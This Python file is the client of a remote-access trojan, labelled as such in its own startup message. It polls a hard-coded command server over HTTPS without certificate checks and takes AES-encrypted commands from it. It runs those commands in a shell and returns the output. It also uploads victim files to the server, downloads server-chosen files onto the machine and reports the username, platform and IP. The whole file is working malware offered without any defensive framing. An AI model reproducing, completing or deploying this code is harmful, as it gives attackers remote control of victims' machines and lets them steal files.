from subprocess import Popen, PIPE
from socket import socket, AF_INET, SOCK_DGRAM
from getpass import getuser
from platform import platform
from time import sleep
from os import name
from requests import post, packages
from json import dumps, loads
from base64 import b64encode, b64decode
from os.path import basename, getsize, exists, isfile
from Crypto.Cipher import AES
from binascii import a2b_hex, b2a_hex
from hashlib import md5
import time
from random import randint
from Crypto.Random import get_random_bytes
from hashlib import sha256
from hmac import HMAC
from binascii import b2a_hex, a2b_hex
import json
import os

packages.urllib3.disable_warnings()
key = ''
aes_key = ''
IP = "10.7.10.8"
PORT = 9002
class Config:
    def __init__(self, server_ip="192.168.0.32", server_port=9002, endpoints=None):
        self.server_ip = server_ip
        self.server_port = server_port
        

        self.default_endpoints = {
            "get_keys": "/getkeys",
            "get_payload": "/getname",
            "add_result": "/addrst",
            "update_key": "/updatekey",
            "file_download": "/file/download",
            "filedownload": "/filedownload",
            "fileupload": "/fileupload"
        }
        

        if endpoints:
            self.default_endpoints.update(endpoints)
            

        self.base_url = f"https://{self.server_ip}:{self.server_port}"
        
    def get_url(self, endpoint):

        return self.base_url + self.default_endpoints.get(endpoint, "")

class DataAesCrypt:

    def __init__(self, keys: str, data: str) -> None:
        self.keys = keys[:16].encode("utf-8")
        self.data = data
    def encrypt(self):
        text = self.data + (16 - (len(self.data) % 16)) * "="
        aes = AES.new(self.keys, AES.MODE_ECB)
        en_text = b2a_hex(aes.encrypt(text.encode("utf-8")))
        return en_text.decode("utf-8")
    def decrypt(self) -> str:
        try:
            aes = AES.new(self.keys, AES.MODE_ECB)
            decrypted_data = aes.decrypt(a2b_hex(self.data.encode("utf-8")))

            try:
                last_valid = -1
                for i in range(len(decrypted_data)-1, -1, -1):
                    if decrypted_data[i:i+1] in b'{}[]"\'0123456789':
                        last_valid = i + 1
                        break
                if last_valid > 0:
                    decrypted_data = decrypted_data[:last_valid]
            except:
                pass
            

            text = decrypted_data.decode("utf-8").rstrip("=")
            print(f"[DEBUG] Decrypted raw data: {text}")
            return text
        except Exception as e:
            print(f"[ERROR] Decryption failed: {e}")
            raise
    

class FileCrypto:

    FIXED_IV = b'1234567890abcdef'

    @staticmethod
    def encrypt(data: bytes, key: str) -> bytes:

        key_bytes = key[:16].encode("utf-8")
        print(key_bytes)
        cipher = AES.new(key_bytes, AES.MODE_CBC, FileCrypto.FIXED_IV)
        

        padding_length = 16 - len(data) % 16
        data += bytes([padding_length]) * padding_length
        
        encrypted_data = cipher.encrypt(data)
        return encrypted_data

    @staticmethod
    def decrypt(data: bytes, key: str) -> bytes:

        key_bytes = key[:16].encode("utf-8")
        cipher = AES.new(key_bytes, AES.MODE_CBC, FileCrypto.FIXED_IV)
        decrypted_padded = cipher.decrypt(data)
        

        padding_length = decrypted_padded[-1]
        decrypted_data = decrypted_padded[:-padding_length]
        
        return decrypted_data
    
class BaseFunc:
    def __init__(self):
        self.config = Config(IP, PORT)
        self.localuser = getuser()
        self.sys_info = platform()
        self.current_cmd_data = {}
        self._file_chunks = {}  # 初始化文件块存储

    def download_file_from_server(self):
        # 准备请求数据，包含 hostkey 和自定义保存路径
        head = {"Cookie": "cid=" + key}
        print("The key sent in the getpay function", key)
        url = self.config.get_url("filedownload")
        head = {"Cookie": "cid=" + key}
        
        # 发送请求到服务器的 /filedownload 接口
        response = post(url = url, headers=head, timeout=5, verify=False)
        print("文件成功下载")
        if response.status_code == 200:
            # 获取服务器返回的文件名
            filename = response.headers['Content-Disposition'].split('filename=')[1].split(';')[0]
            print(filename)
            filename = filename.strip('"')
            
            # 获取自定义保存路径
            save_path = None
            for part in response.headers['Content-Disposition'].split(';'):
                if part.strip().startswith('path='):
                    save_path = part.split('=')[1].strip()
            save_path = save_path.strip('"')
            save_path = save_path.rstrip('/')

            file_path = save_path + "en"
            # 将文件保存到指定路径
            with open(file_path, 'wb') as f:
                f.write(response.content)
            
            print(f"File saved to {file_path}")
        else:
            print(f"Error: {response.status_code} - {response.text}")

        # 解密文件
        try:
            print("正在解密文件...")
            with open(file_path, "rb") as enc_fp:
                encrypted_data = enc_fp.read()
            decrypted_data = FileCrypto.decrypt(encrypted_data, key)  # 使用密钥解密数据

            decrypted_filepath = save_path # 解密后的文件路径
            with open(decrypted_filepath, "wb") as dec_fp:
                dec_fp.write(decrypted_data)

            print(f"文件解密完成，保存路径：{decrypted_filepath}")

            # 删除加密文件
            from os import remove
            remove(file_path)
            print(f"临时加密文件已删除：{file_path}")
        except Exception as e:
            print(f"文件解密时发生错误：{e}")

    def upload_file_to_server(self, filepath):
        if not exists(filepath.strip()):  # 判断要上传的文件是否存在
            print("文件不存在！")
            return -1
        
        head = {"Cookie": "cid=" + key}
        print("The key sent in the getpay function", key)
        url = self.config.get_url("fileupload")
        head = {"Cookie": "cid=" + key}
        # 加密文件准备
        encrypted_filepath = filepath + ".enc"

        try:
            with open(filepath, "rb") as original_file:
                original_data = original_file.read()
            encrypted_data = FileCrypto.encrypt(original_data, key)  # 使用对应的密钥进行加密
            with open(encrypted_filepath, "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
            print(f"文件加密完成")
        except Exception as e:
            print(f"文件加密失败：{e}")
            return -1
        
        filename = basename(encrypted_filepath)  # 获取加密文件的名称
        filesize = getsize(encrypted_filepath)  # 获取加密文件的大小

        #asyncio.get_event_loop().run_until_complete(self.upload_large_file(uri, encrypted_filepath))
        with open(encrypted_filepath, "rb") as f:
            files = {'file': (basename(encrypted_filepath), f)}  # 注意这里传递的是二元组
            response = post(url=url, headers=head, files=files, verify=False)
            print(response)

        try:
            from os import remove
            remove(encrypted_filepath)
            print(f"临时加密文件已删除：{encrypted_filepath}")
        except Exception as e:
            print(f"删除加密文件失败：{e}")

        return 0
    
        
    def handle_file_operations(self, cmd_data):
        print(f"[DEBUG] Processing file operations: {cmd_data}")
        if cmd_data.get('cdm') == 'send_file':
            print(cmd_data)
            self.upload_file_to_server(cmd_data.get('file_path'))
        elif cmd_data.get('cdm') == 'upload_file':
            print("开始请求文件下载")
            self.download_file_from_server()
    def pad_data(self, data):
        block_size = 16
        padding_length = block_size - (len(data) % block_size)
        padding = bytes([padding_length] * padding_length)
        return data + padding

    def exc(self, cdm: str):
        print(f"[DEBUG] Execute command: {cdm}")
        print(f"[DEBUG] Command type: {type(cdm)}")
        print(f"[DEBUG] Command length: {len(cdm) if isinstance(cdm, str) else 'N/A'}")
        rst = self.getbaseinfo()
        
        if isinstance(cdm, str) and cdm != '':
            try:

                if cdm == "getlive":
                    rst['cdm'] = "getlive"
                    rst['data'] = "Successfully launched!"
                    return rst
                elif cdm == "set time":
                    rst["cdm"] = "set time"
                    rst["data"] = "Time setting successful"
                    return rst
                

                try:

                    if self.current_cmd_data and isinstance(self.current_cmd_data, dict):
                        cmd_data = self.current_cmd_data
                        print(f"[DEBUG] Use saved command data: {cmd_data}")
                        

                        if cmd_data.get('cdm') in ['upload_file', 'send_file']:
                            print(f"[DEBUG] process the file{cmd_data.get('cdm')}command")
                            result = self.handle_file_operations(cmd_data)
                            if result:
                                return result
                            return rst
                        

                        if 'cdm' in cmd_data:
                            shell_cmd = cmd_data['cdm']
                            print(f"[DEBUG] Execute shell command: {shell_cmd}")
                            r = Popen(shell_cmd, shell=True, stderr=PIPE, stdout=PIPE)
                            output = r.stdout.read()
                            error = r.stderr.read()
                            
                            if output:
                                rst['data'] = output.decode("utf-8")
                            elif error:
                                rst['data'] = error.decode("utf-8")
                            else:
                                rst['data'] = "Command executed with no output"
                            rst['cdm'] = shell_cmd
                            print(f"[DEBUG] Command execution result: {rst}")
                            return rst
                            
                    else:

                        r = Popen(cdm, shell=True, stderr=PIPE, stdout=PIPE)
                        output = r.stdout.read()
                        error = r.stderr.read()
                        
                        if output:
                            rst['data'] = output.decode("utf-8")
                        elif error:
                            rst['data'] = error.decode("utf-8")
                        else:
                            rst['data'] = "Command executed with no output"
                        rst['cdm'] = cdm
                        print(f"[DEBUG] Command execution result: {rst}")
                        return rst
                        
                except Exception as e:
                    print(f"[ERROR] Command execution error: {e}")
                    rst['cdm'] = cdm
                    rst['status'] = 'error'
                    rst['error'] = str(e)
                    return rst
                    
            except Exception as e:
                print(f"[ERROR] Command execution error: {e}")
                rst['cdm'] = cdm
                rst['status'] = 'error'
                rst['error'] = str(e)
                return rst
                
        return rst

    def getbaseinfo(self) -> dict:
        try:
            s = socket(AF_INET, SOCK_DGRAM)
            s.connect(('anaconda.com', 0))
            local_ip = s.getsockname()[0]
            rst = {"localuser": self.localuser, "sys_info": self.sys_info, "local_ip": local_ip}
        except:
            rst = {"localuser": self.localuser, "sys_info": self.sys_info, "local_ip": None}
        finally:
            return rst

    def update_aes_key(self, key: str, aes_key: str) -> str:
        try:
            new_aes_key = md5((str((randint(1, 65535))) + "pkcn").encode("utf-8")).hexdigest()[:16]
            signature = DataAesCrypt(aes_key, key).encrypt()

            url = self.config.get_url("update_key")
            payload = {
                "key": key,
                "new_aes_key": new_aes_key,
                "signature": signature
            }
            rst = post(url=url, json=payload, timeout=5, verify=False)
            if rst.status_code == 200:
                print("AES key update successful!")
                return new_aes_key
            else:
                print("AES key update failed:", rst.text)
                return "error"
        except Exception as e:
            print(f"An error occurred while updating the AES key:{e}")
            return "error"

    def getkeys(self):

        try:
            url = self.config.get_url("get_keys")
            rst = post(url=url, timeout=5, verify=False)
            if rst.status_code == 404 and rst.headers.get("Cookie"):
                cookie_data = rst.headers.get("Cookie")
                print("Cookie data returned by the server:", cookie_data)
                decoded_data = b64decode(cookie_data).decode("utf-8")
                print("Base64 decoded data:", decoded_data)
                if ":" in decoded_data:
                    key, aes_key = decoded_data.split(":")
                    return key, aes_key
                else:
                    print("The decoded data format does not meet expectations")
                    return "error", "error"
            else:
                print("No valid cookies were obtained")
                return "error", "error"
        except Exception as e:
            print(f"An error occurred while obtaining the key: {e}")
            return "error", "error"

    def getpay(self, key: str, aeskey: str):
        head = {"Cookie": "cid=" + key}
        print("The key sent in the getpay function", key)
        url = self.config.get_url("get_payload")
        
        try:
            rst = post(url=url, headers=head, timeout=5, verify=False)
            if rst.status_code == 404:
                try:
                    response_data = rst.json()
                    if response_data.get('status') == 'success':
                        encrypted_data = response_data.get('data')
                        print(f"[DEBUG] Received encrypted data: {encrypted_data}")
                        
                        try:
                            decrypted_data = DataAesCrypt(aeskey, encrypted_data).decrypt()
                            print(f"[DEBUG] Decryption successful")
                            
                            try:
                                parsed_data = loads(decrypted_data)
                                print(f"[DEBUG] JSON parsing successful")
                                return parsed_data
                            except json.JSONDecodeError as e:
                                print(f"[ERROR] JSON parsing failed: {e}")
                                print(f"[DEBUG] Problematic string: {decrypted_data}")

                                # Attempt to clean data
                                cleaned_data = decrypted_data.strip()
                                while cleaned_data and not cleaned_data[-1] in ['}', ']', '"', "'", '0', '9']:
                                    cleaned_data = cleaned_data[:-1]
                                try:
                                    return loads(cleaned_data)
                                except:
                                    print("[ERROR] JSON repair failed")
                                    return False
                        except Exception as e:
                            print(f"[ERROR] Data decryption failed: {e}")
                            return False
                    else:
                        print(f"[ERROR] Server returned error status: {response_data.get('message', 'Unknown error')}")
                        return False
                except Exception as e:
                    print(f"[ERROR] Response parsing failed: {e}")
                    return False
            if rst.status_code == 500:
                print("Server error")
                return "exit"
            else:
                return False
        except Exception as e:
            print(f"[ERROR] Request failed: {e}")
            return False


def main():
    print("[DEBUG] Starting trojan")
    base = BaseFunc()
    
    global key, aes_key
    key, aes_key = base.getkeys()
    print(f"[DEBUG] Got keys - key: {key}, aes_key: {aes_key}")
    
    if key == "error" or aes_key == "error":
        print("[ERROR] Failed to get keys, exiting")
        return
        
    sleep_time = 10
    update_interval = 60
    last_update = 0

    while True:
        if key:
            try:
                current_time = time.time()
                if current_time - last_update > update_interval:
                    new_aes_key = base.update_aes_key(key, aes_key)
                    if new_aes_key != "error":
                        aes_key = new_aes_key
                    last_update = current_time

                rst = base.getpay(key, aes_key)
                print(f"[DEBUG] Received payload: {rst}")
                
                if rst == "exit":
                    break
                    
                if isinstance(rst, dict):

                    base.current_cmd_data = rst
                    print(f"[DEBUG] Saved command data: {base.current_cmd_data}")

                    if rst.get('cdm') == 'upload_file':
                        result = base.handle_file_operations(rst)
                    else:
                        
                        result = base.exc(rst.get('cdm', ''))
                        
                    print(f"[DEBUG] Command execution result: {result}")
                    
                    if isinstance(result, dict):
                        head = {"Cookie": "cid=" + key}
                        data = {"data": DataAesCrypt(aes_key, dumps(result)).encrypt()}
                        response = post(
                            url=base.config.get_url("add_result"),
                            headers=head,
                            data=data,
                            timeout=5,
                            verify=False
                        )
                        print(f"[DEBUG] Result sent: {response.status_code}")
                        
            except Exception as e:
                print(f"[ERROR] Main loop error: {e}")
                import traceback
                traceback.print_exc()
            sleep(sleep_time)
        else:
            break

if __name__ == "__main__":
    main()
